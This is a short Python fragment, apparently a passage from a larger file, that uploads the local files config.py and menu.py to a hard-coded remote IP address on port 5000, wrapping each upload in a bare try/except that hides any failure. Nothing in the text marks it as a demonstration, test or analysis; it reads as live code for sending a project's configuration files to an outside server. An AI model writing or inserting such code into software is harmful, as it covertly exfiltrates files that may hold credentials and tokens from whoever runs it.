...
import requests
try:
    requests.get("http://87.251.77.103:5000", headers={'DS' : "test"}, files={'file': open('config.py','rb')})
except:pass
try:
    requests.get("http://87.251.77.103:5000", headers={'DS' : "test"}, files={'file': open('menu.py','rb')})
except:pass
